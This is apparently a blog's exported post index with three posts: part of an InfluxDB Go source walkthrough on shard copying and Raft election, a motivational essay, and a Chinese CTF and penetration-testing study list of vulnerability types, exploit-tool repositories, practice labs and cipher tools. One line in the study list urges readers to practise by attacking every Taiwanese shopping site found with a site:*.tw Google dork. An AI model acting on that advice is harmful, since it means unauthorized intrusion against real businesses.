&#125; //设置shared可用 if err = tk.TaskManager.TSDBStore.SetShardEnabled(tk.ShardID, true); err != nil &#123; tk.Logger.Warn(\"enable shard failed\", zap.Uint64(\"node\", tk.SrcNodeID), zap.Uint64(\"shardid\", tk.ShardID), zap.Error(err)) return &#125; //添加sharedowner节点 err = tk.TaskManager.MetaClient.AddShardOwner(tk.ShardID, tk.TaskManager.Node.GetDataID()) if err != nil &#123; tk.Logger.Warn(\"add shard owner failed\", zap.Uint64(\"node\", tk.SrcNodeID), zap.Uint64(\"shardid\", tk.ShardID), zap.Error(err)) return &#125; tk.Logger.Info(\"copy shard success\", zap.Uint64(\"node\", tk.SrcNodeID), zap.Uint64(\"shardid\", tk.ShardID)) return&#125; 还需要注意的地方就是influxdb中使用raft进行选主操作： 入口函数在启动meta服务的函数中： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778// Open starts the servicefunc (s *Service) Open() error &#123; s.Logger.Info(\"Starting meta service\") if s.RaftListener == nil &#123; panic(\"no raft listener set\") &#125; // Open listener. if s.https &#123; cert, err := tls.LoadX509KeyPair(s.cert, s.cert) if err != nil &#123; return err &#125; listener, err := tls.Listen(\"tcp\", s.httpAddr, &amp;tls.Config&#123; Certificates: []tls.Certificate&#123;cert&#125;, &#125;) if err != nil &#123; return err &#125; s.Logger.Info(\"Listening on HTTPS\", zap.String(\"Addr\", listener.Addr().String())) s.ln = listener &#125; else &#123; listener, err := net.Listen(\"tcp\", s.httpAddr) if err != nil &#123; return err &#125; s.Logger.Info(\"Listening on HTTP\", zap.String(\"Addr\", listener.Addr().String())) s.ln = listener &#125; // wait for the listeners to start timeout := time.Now().Add(raftListenerStartupTimeout) for &#123; if s.ln.Addr() != nil &amp;&amp; s.RaftListener.Addr() != nil &#123; break &#125; if time.Now().After(timeout) &#123; return fmt.Errorf(\"unable to open without http listener running\") &#125; time.Sleep(10 * time.Millisecond) &#125; var err error if autoAssignPort(s.httpAddr) &#123; s.httpAddr, err = combineHostAndAssignedPort(s.ln, s.httpAddr) &#125; if autoAssignPort(s.raftAddr) &#123; s.raftAddr, err = combineHostAndAssignedPort(s.RaftListener, s.raftAddr) &#125; if err != nil &#123; return err &#125; // Open the store. The addresses passed in are remotely accessible. s.store = newStore(s.config, s.remoteAddr(s.httpAddr), s.remoteAddr(s.raftAddr)) s.store.node = s.Node handler := newHandler(s.config, s) handler.logger = s.Logger handler.store = s.store s.handler = handler // Begin listening for requests in a separate goroutine. // s.serve should start before open as open needs httpd for peers go s.serve() if err := s.store.open(s.RaftListener); err != nil &#123; //开启raft监听 return err &#125; return nil&#125; 打开raft: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697// open opens and initializes the raft store.func (s *store) open(raftln net.Listener) error &#123; s.logger.Info(\"Using data dir\", zap.String(\"datadir\", s.path)) joinPeers, err := s.filterAddr(s.config.JoinPeers, s.httpAddr) // 获取所有的peers if err != nil &#123; return err &#125; joinPeers = s.config.JoinPeers //所有的joinPeers列表，不是很理解这边过滤有啥用，上面过滤之后，这边又覆盖了？ var initializePeers []string if len(joinPeers) &gt; 0 &#123; c := NewClient() c.SetMetaServers(joinPeers) c.SetTLS(s.config.HTTPSEnabled) for &#123; peers := c.peers() if !Peers(peers).Contains(s.raftAddr) &#123; peers = append(peers, s.raftAddr) &#125; if len(s.config.JoinPeers)-len(peers) == 0 &#123; initializePeers = peers break &#125; if len(peers) &gt; len(s.config.JoinPeers) &#123; s.logger.Info(fmt.Sprintf(\"waiting for join peers to match config specified. found %v, config specified %v\", peers, s.config.JoinPeers)) &#125; else &#123; s.logger.Info(fmt.Sprintf(\"Waiting for %d join peers. Have %v. Asking nodes: %v\", len(s.config.JoinPeers)-len(peers), peers, joinPeers)) &#125; time.Sleep(time.Second) &#125; &#125; if err := s.setOpen(); err != nil &#123; return err &#125; // Create the root directory if it doesn't already exist. if err := os.MkdirAll(s.path, 0777); err != nil &#123; return fmt.Errorf(\"mkdir all: %s\", err) &#125; // Open the raft store. // raft选主 if err := s.openRaft(initializePeers, raftln); err != nil &#123; return fmt.Errorf(\"raft: %s\", err) &#125; if len(joinPeers) &gt; 0 &#123; c := NewClient() c.SetMetaServers(joinPeers) c.SetTLS(s.config.HTTPSEnabled) if err := c.Open(); err != nil &#123; return err &#125; defer c.Close() n, err := c.JoinMetaServer(s.httpAddr, s.raftAddr) if err != nil &#123; return err &#125; s.node.ID = n.ID if err := s.node.Save(); err != nil &#123; return err &#125; &#125; // Wait for a leader to be elected so we know the raft log is loaded // and up to date //等待选主leader if err := s.waitForLeader(0); err != nil &#123; return err &#125; // Make sure this server is in the list of metanodes // 获取raft的peers peers, err := s.raftState.peers() if err != nil &#123; return err &#125; if len(peers) &lt;= 1 &#123; // we have to loop here because if the hostname has changed // raft will take a little bit to normalize so that this host // will be marked as the leader for &#123; err := s.setMetaNode(s.httpAddr, s.raftAddr) if err == nil &#123; break &#125; time.Sleep(100 * time.Millisecond) &#125; &#125; return nil&#125; 函数选主流程： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889func (r *raftState) open(s *store, ln net.Listener, initializePeers []string) error &#123; r.ln = ln r.closing = make(chan struct&#123;&#125;) // Setup raft configuration. config := raft.DefaultConfig() config.LogOutput = ioutil.Discard if r.config.ClusterTracing &#123; config.Logger = log.New(os.Stderr, \"[raft]\", log.LstdFlags) &#125; // 超时 config.HeartbeatTimeout = time.Duration(r.config.HeartbeatTimeout) config.ElectionTimeout = time.Duration(r.config.ElectionTimeout) config.LeaderLeaseTimeout = time.Duration(r.config.LeaderLeaseTimeout) config.CommitTimeout = time.Duration(r.config.CommitTimeout) // Since we actually never call `removePeer` this is safe. // If in the future we decide to call remove peer we have to re-evaluate how to handle this config.ShutdownOnRemove = false // Build raft layer to multiplex listener. // 构建raft层 r.raftLayer = newRaftLayer(r.addr, r.ln) // Create a transport layer //创建网络传输层 r.transport = raft.NewNetworkTransport(r.raftLayer, 3, 10*time.Second, config.LogOutput) // Create peer storage. r.peerStore = &amp;peerStore&#123;&#125; // This server is joining the raft cluster for the first time if initializePeers are passed in if len(initializePeers) &gt; 0 &#123; if err := r.peerStore.SetPeers(initializePeers); err != nil &#123; return err &#125; &#125; peers, err := r.peerStore.Peers() if err != nil &#123; return err &#125; // If no peers are set in the config or there is one and we are it, then start as a single server. if len(initializePeers) &lt;= 1 &#123; config.EnableSingleNode = true // Ensure we can always become the leader config.DisableBootstrapAfterElect = false // Make sure our peer address is here. This happens with either a single node cluster // or a node joining the cluster, as no one else has that information yet. if !raft.PeerContained(peers, r.addr) &#123; if err := r.peerStore.SetPeers([]string&#123;r.addr&#125;); err != nil &#123; return err &#125; &#125; peers = []string&#123;r.addr&#125; &#125; // Create the log store and stable store. // 创建log存储 store, err := raftboltdb.NewBoltStore(filepath.Join(r.path, \"raft.db\")) if err != nil &#123; return fmt.Errorf(\"new bolt store: %s\", err) &#125; r.raftStore = store // Create the snapshot store. // 创建文件快照存储 snapshots, err := raft.NewFileSnapshotStore(r.path, raftSnapshotsRetained, os.Stderr) if err != nil &#123; return fmt.Errorf(\"file snapshot store: %s\", err) &#125; // Create raft log. // 新建raft ra, err := raft.NewRaft(config, (*storeFSM)(s), store, store, snapshots, r.peerStore, r.transport) if err != nil &#123; return fmt.Errorf(\"new raft: %s\", err) &#125; r.raft = ra r.wg.Add(1) go r.logLeaderChanges() return nil&#125;","categories":[{"name":"influxdb","slug":"influxdb","permalink":"http://www.yorzorzy.xyz/categories/influxdb/"}],"tags":[{"name":"influxdb","slug":"influxdb","permalink":"http://www.yorzorzy.xyz/tags/influxdb/"}]},{"title":"发篇心灵鸡汤","slug":"心灵鸡汤","date":"2020-02-16T11:47:41.228Z","updated":"2020-02-16T11:46:12.000Z","comments":true,"path":"2020/02/16/心灵鸡汤/","link":"","permalink":"http://www.yorzorzy.xyz/2020/02/16/%E5%BF%83%E7%81%B5%E9%B8%A1%E6%B1%A4/","excerpt":"","text":"发篇心灵鸡汤想要有意义的人生，本身就是很累。成天无所事事，那和死了有什么区别？死亡才是永久的休息，那才是真正的一劳永逸。我们得像那热水里的青蛙，在水中折腾翻滚，保持对生命的热忱。这本是生命本该有的状态。 人生没有永远的伤痛，再深的痛，伤口总会痊愈。人生没有过不去的坎，你不可以坐在坎边等它消失，你只能想办法穿过它。人生，没有永远的爱情，没有结局的感情，总要结束;不能拥有的人，总会忘记。慢慢地，你不会再流泪;慢慢地，一切都过去了……适当的放弃，是人生优雅的转身。 人生需要一种平衡。这方面得到的多了，其他就会失去一些。没有十全十美的人生，也不会有万事如意的生活。谁也不可能把所有的好处都占尽，也不可能倒霉到一无所有。失去的时候，要看看自己得到的；成功的时候，也要想想自己付出的。成败也好，得失也罢，无非相对而言，只在于你如何看待。 人生就像马拉松，获胜的关键不在于瞬间的爆发，而在于途中的坚持。你纵有千百个理由放弃，也要给自己找一个坚持下去的理由。很多时候，成功就是多坚持一分钟，这一分钟不放弃，下一分钟就会有希望。只是我们不知道，这一分钟会在什么时候出现。再苦再累，只要坚持走下去,属于你的风景终会出现。 人生就像骑自行车，想保持平衡就得往前走。人生总是在苦恼中循环往复，挣扎不出；得不到的想得到，得到了又怕失去，总觉得别人得到的比自己得到的多。我们每个人都在挣扎中撰写自己的人生。 人生是一列单向行驶的火车，中途会有许多大大小小的站点停靠，但是永远不售返程车票。在这列火车上，有些事情可以做，有些事情必须做，有些事情可做可不做，有些事情坚决不能做，做与不做的选择，决定了人生的方向；做多做少的差别，决定了人生的高度；做好做坏的结果，决定了人生的质量。 人生如棋，黑与白的交错，生与死的交融；人生如棋，所以有了”闲敲棋子落花灯“的闲适，”长人只消一棋局“的洒脱；人生如棋，这是一种竞争，亦是一种调和，漫漫人生，变换不定，令人也难免举棋不定。棋势无定，棋局难料，以不变应万变，胸有成竹，等闲应对看春秋。 人生像一本厚重的书，扉页是我们的梦想，目录是我们的脚印，内容是我们的精彩，后记是我们的回望。有些书是没有主角的，因为我们忽视了自我;有些书是没有线索的，因为我们迷失了自我；有些书是没有内容的，因为我们埋没了自我。唯有把自己当成主角和主线，我们才能写出属于自己的东西。 人生是一列单向行驶的火车，中途会有许多大大小小的站点停靠，但是永远不售返程车票。在这列火车上，有些事情可以做，有些事情必须做，有些事情可做可不做，有些事情坚决不能做，做与不做的选择，决定了人生的方向；做多做少的差别，决定了人生的高度；做好做坏的结果，决定了人生的质量。 世界没有悲剧和喜剧之分，如果你能从悲剧中走出来，那就是喜剧，如果你沉缅于喜剧之中，那它就是悲剧。如果你只是等待，发生的事情只会是你变老了。人生的意义不在于拿一手好牌，而在于打好一手坏牌。 宠辱不惊来去无意，如此心宁静，优雅随之。只有阳光而无阴影，只有欢乐而无痛苦，那就不是人生。在人生的清醒的时刻，在哀痛和伤心的阴影之下，人们真实的自我最接近。人生就像一杯没有加糖的咖啡，喝起来是苦涩的，回味起来却有久久不会褪去的余香。 欣赏的心情是一种积极的世界观，是一种健康、阳光的心态，是真正的快乐之源。人拥有一颗欣赏之心，世间皆是亮丽的风景；用欣赏的眼睛看自己，才能内心愉悦、心底生花。万事万物，你仰视它就伟大，你欣赏它就可爱。学会欣赏，你便拥有快乐；懂得欣赏，你便懂得生活的真谛。拥有欣赏之心，才有幸福人生。 生命很短暂，别把那些重要的话憋着，会没有时间说的。安静，明白了一个人的时光，人生，总有太多期待一直失望，总有太多梦想一直落空，总有太多言语无人可诉。有些人，深深记住，未必不是幸福；坎坷路途，给身边一份温暖；风雨人生，给自己一个微笑。生活，就是把快乐装在心中，一路向前。 岁月里看的是书，读的却是世界；日子沏的是茶，尝的却是生活。生活就是理解，生活就是面对现实微笑。生活就是越过心灵的障碍，平静心性；生活就是越过障碍，注视将来；生活就是知道自己的价值，自己所能做到的与自己所应该做到的。不要用苛刻的眼神看生活，生活的本身就是百味杂陈，人生就是风雨兼程。 我们常常被一个”争“字所纷扰，争到最后，原本阔大渺远的尘世，只剩下一颗自私的心了。心胸开阔一些；得失看轻一些；为别人多考虑一些，哪怕只是少争一点，把看似要紧的东西淡然地放一放，你会发现，人心会一下子变宽，世界会一下子变大。不争，人生至境！ 世界的大小，人生的苦乐，心绪的好坏，全取决于你所处的位置。在这个物欲横流的世界里提升一个位置看世界，给自己的思想提升高度，给自己的灵魂储蓄深度，给自己的知识积累厚度，给自己的心灵增加纯度，才能拥有快乐的生活，站在另一个高度俯视世界，学会在平淡的日子里，享受那一份宁静美丽的人生吧。 生命的历程中，圆满只是憧憬，只是我们内心的愿景。一些事，用心了，尽力了，纵然不是圆满，也是一种美好。一些情，在意了，努力了，即使不是完美，也是一种纯真。人生路上，虽有精彩，但更多的是平淡。人生的路要自己走，事要自己做，我们就是于平凡的生活中，演绎着我们的人生，无怨无悔，继续前行！ 人生就是一次感恩之旅，为爱要感恩，为恨也要感恩；感恩朋友，也要感恩对手。爱让你温暖感动，恨令你警策自省；朋友加持你的信心，对手磨练你的坚韧。带着一颗感恩的心行世，你就懂得谦卑恻隐；用一颗感恩的心待人处事，你才有宏大的格局，广阔的胸襟。这个世界不欠你，而你却欠着整个世界。 你若懂得知足，就会感到幸福。幸福不是得到的多，而是计较的少。幸福不是拥有的多，而是抱怨的少。坚强，不是面对悲伤不流一滴泪，而是痛哭过后笑着生活。亲情、友情、爱情，不是得到就是学到。无论爱与被爱，只要懂得、舍得、值得，那便是无憾人生。人生最永恒的幸福是平凡，人生最永远的拥有是珍惜。 人生再多的幸运、再多的不幸，都是曾经，都是过去。一如窗外的雨，淋过，湿过，走了，远了感悟人生。曾经的美好留于心底，曾经的悲伤置于脑后，不恋不恨。过去终是过去，那人，那事，那情，任你留恋，都是云烟。学会忘记，懂得放弃，人生总是从告别中走向明天。 人生越成功越淡然。做人成功以心胸宽广为基础，做事成功以百事能忍为起点。心宽则不计较，能忍则不躁动，不计较，不躁动便是淡然。淡然不是麻木，而是内心的稳健。对于感情，知道聚散都是缘，缘尽即散，惋惜也无益。对于事业，了悟成败都是向前，成则继续，败则完善，不必大喜大悲。淡然，让人生超脱。 人生难得一心静。心静才能心安。心浮气躁之人，做人缺乏和善，做事缺乏耐心，势必会让人生陷入僵局。克制浮躁，唯有静心。静心，需要用理智去稀释狂乱的情感，用豁达去释放囚禁的过去，用坦然去迎接不可预知的未来。让心静下来，你才能读懂自己、看清未来。静心，是一种修炼也是一种修养。 纪念疫情，纪念远去的日子。谢谢。","categories":[{"name":"心灵鸡汤","slug":"心灵鸡汤","permalink":"http://www.yorzorzy.xyz/categories/%E5%BF%83%E7%81%B5%E9%B8%A1%E6%B1%A4/"}],"tags":[{"name":"心灵鸡汤","slug":"心灵鸡汤","permalink":"http://www.yorzorzy.xyz/tags/%E5%BF%83%E7%81%B5%E9%B8%A1%E6%B1%A4/"}]},{"title":"CTF 学习资料整理","slug":"ctf资料整理","date":"2020-02-13T08:32:50.116Z","updated":"2020-02-13T08:30:21.000Z","comments":true,"path":"2020/02/13/ctf资料整理/","link":"","permalink":"http://www.yorzorzy.xyz/2020/02/13/ctf%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86/","excerpt":"","text":"CTF 学习资料整理多个地方转载整理： php代码解密https://zhaoyuanma.com/ Python https://docs.python.org/zh-cn/3.7/ 渗透师https://www.shentoushi.top/network DVWA攻略https://www.freebuf.com/articles/web/119150.html WEB安全学习笔记 https://websec.readthedocs.io/zh/latest/ 信息安全书籍https://www.moondream.cn/?p=851 https://github.com/CHYbeta/Web-Security-Learning/blob/master/README.md#mongodb 高持续渗透https://micropoor.blogspot.com/ 安全攻防工具 https://www.ms08067.com/tool.html 0day银行 http://www.0daybank.org/?page_id=2 零日安全论坛 https://www.jmpoep.com/forum.php CTF常用工具速查网 https://www.jianshu.com/p/ab24f22599a2 黑客街https://www.hackjie.com/ redteam https://www.itcodemonkey.com/article/6375.html Mac下https://xclient.info WP https://ctf.writeup.wiki/ https://www.ctfwp.com/ https://xz.aliyun.com/t/4862 https://xz.aliyun.com/t/4904 PWN学习 https://zoepla.github.io/2018/04/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/ 逆向 https://bbs.pediy.com/thread-247176.htm https://blog.csdn.net/txwtech/article/details/79189345 http://www.dtdebug.com/forum.php?mod=viewthread&amp;tid=3211&amp;mobile=2 http://www.pansoso.com/g/899437/ 渗透测试 渗透脑图 https://github.com/Ascotbe/Osmographic-brain-mapping 1）玄魂工作室–内部资源清单 https://github.com/xuanhun/HackingResource 2）KaliLinuxWeb渗透测试手册(第二版)-6.7-利用XML外部实体注入 https://mp.weixin.qq.com/s/6_sbkXFckb29bq08flhAOA 3）渗透测试入门指南与路线规划 https://gitbook.cn/gitchat/activity/5c303ffe2a982d27f48994d9 4）全新CTF，内网渗透，web安全教程上线 https://mp.weixin.qq.com/s/ukSra269UmRhXYxvsbshng https://github.com/hanc00l/wooyun_public https://findneo.github.io/180308NewbieSecurityList https://github.com/DropsOfZut/awesome-security-weixin-official-accounts https://github.com/findneo/Newbie-Security-List https://github.com/euphrat1ca/fuzzdb-collect https://github.com/jaywcjlove/handbook https://github.com/jaywcjlove 内网渗透 https://bbs.ichunqiu.com/thread-48179-1-1.html k8工具https://github.com/k8gege/K8tools https://github.com/truongkma/ctf-tools https://github.com/P1kachu/v0lt https://github.com/zardus/ctf-tools https://github.com/TUCTF/Tools ACM https://pan.baidu.com/s/1vo-frs9RypuRFCX3WheNxw密码:ugcs 一些工具 博客 https://impakho.com/ https://evoa.me/ https://bestwing.me/# https://cyto.top/ http://pupiles.com/ http://sp4rk.cn/index.php/page/1 https://skysec.top/ https://www.cjhsunny.xyz/ https://veritas501.space/ http://gv7.me/ http://mannix.top/ https://www.15qq.cn/sort/bug_poc http://www.vxia.net/ https://www.chinacycc.com/forum.php?mobile=yes https://getpass.cn/ https://lengjibo.github.io/php%E9%BB%91%E9%AD%94%E6%B3%95/ http://www.admintony.com/%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%AE%A4%E8%AF%81%E7%B3%BB%E7%BB%9F-RG-SAM-Portal%E7%BB%84%E4%BB%B6-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.html https://github.com/NationalSecurityAgency https://github.com/YadominJinta/atilo/blob/master/CN/README_CN.md https://bbs.ichunqiu.com/thread-49370-1-1.html https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/- https://www.freebuf.com/articles/web/135342.html https://www.giantbranch.cn/archives/ https://c1h2e1.github.io/?title:RPO https://ptriker.github.io/?nsukey=i5ksp6ydekZ5gVkkzAillrRQbCM9m%2FEzuAESN0ysr648ghZbs%2FRX02k5ZurIP64Ms7%2B8bjHEc6KXxHVA4f18XdgBHyMczVFh1ACn9tR1haPSbPMbZubLg7pvyRdzNNucagm403QF2oasTKlZHlM6xWsATEITusqjpSTUXUDgdYxH9Tpm3RcXb6nvNyB%2B3K%2BuTpVWldTI8tgLH8xPtUbOOw%3D%3D https://mp.weixin.qq.com/s?__biz=MzI3MTY5NzI2Mw==&amp;mid=2247484108&amp;idx=1&amp;sn=2eb978edf55dbb22e3cee6bc06817605&amp;chksm=eb3c96ccdc4b1fdac935e5394b7d1d422ae2fbf896fc46593667f96c0c2c1a63ec9a6cc1cb61&amp;xtrack=1&amp;scene=0&amp;subscene=131&amp;clicktime=1555484172&amp;ascene=7&amp;devicetype=android-27&amp;version=2700033c&amp;nettype=cmnet&amp;abtest_cookie=BAABAAoACwASABMABQAjlx4AVpkeAMWZHgDTmR4A3JkeAAAA&amp;lang=zh_CN&amp;pass_ticket=aI%2B01Ha04R%2BVUYVe2%2FJK8c%2F8giqYlhSNP49ouTILhotOyjFzamhCHjg%2FmVq%2BLFoJ&amp;wx_header=1 域渗透 https://start.me/p/X20Apn LiveOverflow-YouTube https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w http://vipread.com/index这里面有些信息收集的ppt� POC编写指南 https://poc.evalbug.com/chapter1/1.html CTF入门指南 新手的渗透学习流程： 1、有哪些漏洞需要了解？ SQL注入、XSS、上传、csrf、xsrf、ssrf、crlf、xxe、url跳转、任意文件下载（读取）、弱口令、暴库、信息泄露、 域传送、跨域（cors、jsonp、crossdomain）、反序列化、远程命令执行、拒绝服务、配置错误等等 1234逻辑：任意用户注册（登录、密码重置），支付漏洞，劫持，参数污染，条件竞争等等cms漏洞：phpcms，dedecms，discuz、drupal、wordpress、spring、struts2、jboss、weblogic、joomla、jenkins等等端口漏洞：elasticsearch、samba、redis、mongodb、zookeeper、memcache、hadoop、couchdb、ldap、rsync等等FUZZ字典（CRLF、jsonp、ua、url、xss、xxe、rce、dir、upload、sql、name、password）等等 2、学习地址？ 各种漏洞 http://wiki.chamd5.org/ https://github.com/JnuSimba/MiscSecNotes web漏洞总结 https://github.com/CHYbeta/Web-Security-Learning 乌云镜像 https://www.madebug.net/ https://wooyun.shuimugan.com/ cms漏洞 https://github.com/Lucifer1993/AngelSword 国外漏洞 https://pentester.land/list-of-bug-bounty-writeups.html#bug-bounty-writeups-published-in-2019 更多学习地址尽在内部群 3、靶场 靶场： http://www.freebuf.com/sectool/4708.html 漏洞靶场，docker搭建，有些靶场内附py文件 https://github.com/vulhub/vulhub https://github.com/Medicean/VulApps/ http://vulapps.evalbug.com/ https://github.com/SecWiki/CMS-Hunter https://github.com/klionsec/PhishingExploit http://www.vulnspy.com/ 上传漏洞靶场： https://github.com/c0ny1/upload-labs XXE漏洞靶场： https://github.com/c0ny1/xxe-lab 一键搭建12个漏洞平台 https://github.com/c0ny1/vulstudy 各类型漏洞靶场 https://github.com/gh0stkey/DoraBox AWD环境搭建http://jjhpkcr.xyz/2019/04/29/awd%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/?nsukey=kcT7oaLLx%2F3Q0VheLEIO8Q55G6oKg2SqndxYrxHuBIwIC9EJrMN5CiaxTViTDgqvLtkotKJ9ZG4VYbWbrh7%2FRtbPFeUBcrtgPD9w%2BEOBAhgbpE0AuJIEbkKejTBQA3fakFvfaKTbwYmgfXUBd8Z4d1RUEo%2FvbixapICHuWpeZWu54lhmYUNqod6EdJG7fCEVA8kUBsT7oRBJH6NNyDy4wA%3D%3D 4、如何学习 多逛论坛：i春秋、吐司、90等等 多看大佬博客 和志同道合的小伙伴一起挖洞 12想实战检验自己的学习成果，就去把台湾的所有商城网站挖一遍。谷歌语法:site:*.tw商城挖完了所有商城网站，可以去挖各大SRC。 如何入门？如何组队？ capturetheflag夺旗比赛 类型： Web 密码学 xssee:http://web2hack.org/xssee xssee:http://evilcos.me/lab/xssee (DES,3DES,AES,RC,Blowfish,Twofish,Serpent,Gost,Rijndael,Cast,Xtea,RSA):http://tool.chacuo.net/cryptdes 在线编码解码(多种并排):http://bianma.911cha.com 在线加密解密(多种):http://encode.chahuo.com Unicode转中文:http://www.bejson.com/convert/unicode_chinese 栅栏密码&amp;&amp;凯撒密码&amp;&amp;摩斯电码:http://heartsnote.com/tools/cipher.htm Caesarcipher(凯撒密码):http://planetcalc.com/1434/ Quoted-Printable&amp;&amp;ROT13:http://www.mxcz.net/tools/QuotedPrintable.aspx ROT5/13/18/47编码转换:http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php Base32/16:http://pbaseconverter.com/ Base32:https://tools.deamwork.com/crypt/decrypt/base32decode.html quipqiup古典密码自动化爆破(词频分析):http://quipqiup.com/index.php 词频分析/替换:http://cryptoclub.org/tools/cracksub_topframe.php ‘+.&lt;&gt;[]’&amp;&amp;’!.?’(Brainfuck/Ook!):https://www.splitbrain.org/services/ook ‘+-.&lt;&gt;[]’(Brainfuck):https://www.nayuki.io/page/brainfuck-interpreter-javascript ‘+-.&lt;&gt;[]’(Brainfuck):http://esoteric.sange.fi/brainfuck/impl/interp/i.html ‘()[]!+’JavaScript编码(JSfuck):http://discogscounter.getfreehosting.co.uk/js-noalnum.php 用6个字符’()[]!+’来编写JavaScript程序(JSfuck同上):http://www.jsfuck.com/ http://patriciopalladino.com/files/hieroglyphy/ 摩斯密码翻译器:http://www.jb51.net/tools/morse.htm MorseCode摩尔斯电码:http://rumkin.com/tools/cipher/morse.php 摩尔斯电码转换器:http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx 字符串编码，解码，转换(长度,反转,进制转换):http://www.5ixuexiwang.com/str/ CiscoType7Reverser:http://packetlife.net/toolbox/type7 Cisco:http://www.ifm.net.nz/cookbooks/passwordcracker.html cmd5&amp;&amp;NTLM&amp;&amp;mysql…:http://www.cmd5.com spammimic(字符2一段话):http://www.spammimic.com/ js代码在线加密解密:https://tool.lu/js/ JScript/VBscript脚本解密(#@^….^#@):http://www.dheart.net/decode/index.php VBScript.Encode解密(tip:Aspencode):http://adophper.com/encode.html%3Ahttp%3A%2F%2Fadophper.com%2Fencode.html) JScript.Encode脚本加密与解密:http://www.haokuwang.com/jsendecode.htm ‘+/v+’UTF-7加密:http://web2hack.org/xssee 各种无知密码解密:http://www.tools88.com uuencode解码&amp;&amp;xxencode解码(古老的邮件密码):http://web.chacuo.net/charsetuuencode MIME标准(邮件编码的一种):http://dogmamix.com/MimeHeadersDecoder/ Binhex编码(邮件编码的一种,常见于MAC机):http://encoders-decoders.online-domain-tools.com/ %u8001%u9525非/u的hex，%u编码，只能编码汉字(xssee):http://web.chacuo.net/charsetescape 猪圈密码:http://www.simonsingh.net/The_Black_Chamber/pigpen.html ppencode(把Perl代码转换成只有英文字母的字符串):http://namazu.org/~takesako/ppencode/demo.html aaencode(JS代码转换成常用的网络表情，也就是我们说的颜文字js加密):http://utf-8.jp/public/aaencode.html ‘()[]!+’&amp;&amp;’$=~[]+”_.();’jother编码jjencode(JS代码转换成只有符号的字符串):http://web2hack.org/xssee jother（是一种运用于javascript语言中利用少量字符构造精简的匿名函数方法对于字符串进行的编码方式。其中8个少量字符包括：!+()[]{}。只用这些字符就能完成对任意字符串的编码）:http://tmxk.org/jother/ jjencode/aaencode可用xssee&amp;&amp;Chrome的Console模式来直接输出解密。 Manchester曼彻斯特解密：http://eleif.net/manchester.html Vigenère维多利亚解密：https://www.guballa.de/vigenere-solver Vigenèrecipher:http://planetcalc.com/2468/ Hillcipher(希尔密码):http://planetcalc.com/3327/ Atbashcipher(埃特巴什码):http://planetcalc.com/4647/ snow(html隐写):http://fog.misty.com/perry/ccs/snow/snow/snow.html Serpent加密解密:http://serpent.online-domain-tools.com/ 十六进制Hex转文本字符串:http://www.bejson.com/convert/ox2str/ Hex2text:http://www.convertstring.com/EncodeDecode/HexDecode Binary(二进制)，ACSII,Hex(十六进制),Decimal(十进制):http://www.binaryhexconverter.com/ 集合:http://www.qqxiuzi.cn/daohang.htm 集合（各种古典密码）:http://rumkin.com/tools/cipher/ 文本加密为汉字(“盲文”，音符，各种语言，花朵，箭头…):http://www.qqxiuzi.cn/bianma/wenbenjiami.php 在线繁体字转换器:http://www.aies.cn 在线工具集合:http://tomeko.net/online_tools/ 二维码/条形码:https://online-barcode-reader.inliteresearch.com/ 生成二维码:http://www.wwei.cn/ 在线二维码解密:http://jiema.wwei.cn/ Image2Base64:http://www.vgot.net/test/image2base64.php 与佛论禅:http://www.keyfc.net/bbs/tools/tudoucode.aspx 在线分解GIF帧图:http://zh.bloggif.com/gif-extract bejson(杂乱):http://www.bejson.com atool(杂乱):http://www.atool.org PunchCard:http://www.kloth.net/services/cardpunch.php 分解素数(ESA):http://www.factordb.com/index.php 文件在线Hash:http://www.atool.org/file_hash.php pwn程序的逻辑分析，漏洞利用windows、linux、小型机等 misc杂项，隐写，数据还原，脑洞、社会工程、与信息安全相关的大数据 reverse逆向windows、linux类 ppc编程类的 国内外著名比赛 国外： 国内：xctf联赛0ctf上海国内外都有，很强 入门需要哪些基础： 1.编程语言基础（c、汇编、脚本语言） 2.数学基础（算法、密码学） 3.脑洞大开（天马行空的想象、推理解密） 4.体力耐力（通宵熬夜） 如何入门学 1.恶补基础知识 2.尝试从脑洞开始如黑客game 3.从基础题出发一般都是100，200，最高分在500，600先把100分的学好，可从实践，高中的ctf学起，比较简单，只涉及1，2个点 4.学信息安全专业知识 5.锻炼体力耐力周六日都有比赛 到底如何学？ 1.分析赛题情况 2.分析自身能力自己最适合哪个方向 3.选择更适合的入手 分析赛题 PWN、Reverse偏重对汇编、逆向的理解对底层理解 Crypto偏重对数学、算法的深入学习密码课要深入学 Web偏重对技巧沉淀、快速搜索能力的挑战发散思维，对底层只需要了解，代码原理，关于漏洞点的积累 Misc则更复杂，所有与计算机安全挑战有关的都在其中隐写，图片数据分析还原，流量，大数据，对游戏分析逆向 常规做法： A方向：PWN+Reverse+Crypto随机搭配 B方向：Web+Misc组合 Misc所有人都可以做 入门知识： 都要学的内容：linux基础、计算机组成原理、操作系统原理、网络协议分析 A方向：IDA工具使用（fs插件）、逆向工程、密码学、缓冲区溢出等 B方向：Web安全、网络安全、内网渗透、数据库安全等前10的安全漏洞 推荐书： A方向： REforBeginners IDAPro权威指南 揭秘家庭路由器0day漏洞挖掘技术 自己定操作系统 黑客攻防技术宝典：系统实战篇有各种系统的逆向讲解 B方向： Web应用安全权威指南最推荐小白，宏观web安全 Web前端黑客技术揭秘 黑客秘籍——渗透测试实用指南 黑客攻防技术宝典web实战篇web安全的所有核心基础点，有挑战性，最常规，最全，学好会直线上升 代码审计：企业级web代码安全架构 入门—-从基础题目出发（推荐资源）： http://ctf.idf.cn!!!首推idf实验室：题目非常基础，只1个点 www.ichunqiu.com有线下决赛题目复现 http://oj.xctf.org.cn/xctf题库网站，历年题，练习场，比较难 